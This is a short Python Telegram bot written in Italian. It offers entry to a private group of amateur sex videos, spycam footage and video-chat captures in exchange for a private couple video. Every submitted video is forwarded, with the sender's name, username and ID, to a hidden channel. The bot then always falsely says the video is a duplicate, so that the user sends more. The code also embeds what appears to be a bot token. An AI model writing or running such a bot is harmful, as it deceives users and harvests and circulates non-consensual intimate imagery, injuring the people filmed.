from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

import os
TOKEN = os.environ.get("8786810897:AAEG1E43Gy4cOY3kKezbPimUxC3DZGsTyiQ")
CHANNEL_ID = -1003791582402


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user

    # Notifica nella channel che qualcuno ha aperto il bot
    await context.bot.send_message(
        chat_id=CHANNEL_ID,
        text=f"👀 Nuovo utente ha aperto il bot:\n{user.full_name} | @{user.username} | ID: {user.id}"
    )

    await update.message.reply_text(
        "👋 Benvenuto!\n\n"
        "PPer accedere al gruppo privato in cui troverai: ITA rari, Pompe Amatoriali, Azar/Omegle/Uhmegle, Spycam e tanto altro suddivisi per categoria, devi inviare almeno 1 video privato di coppia ITA raro (in cui si sente audio). N.B Il bot controllerà in automatico se il video inviato è già presente nel nostro mega-archivio.\n\n"
        "📹 Invialo direttamente in questa chat per ricevere il link di accesso (il link non è condivisibile).",
        parse_mode="Markdown"
    )

async def ricevi_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user

    await context.bot.forward_message(
        chat_id=CHANNEL_ID,
        from_chat_id=update.message.chat_id,
        message_id=update.message.message_id
    )

    await context.bot.send_message(
        chat_id=CHANNEL_ID,
        text=f"Video da: {user.full_name} | @{user.username} | ID: {user.id}"
    )

    await update.message.reply_text(
        "❌ Video rilevato e già presente nell'archivio.\n\n"
        "Riprova con un nuovo video."
    )

app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.VIDEO, ricevi_video))
app.run_polling()
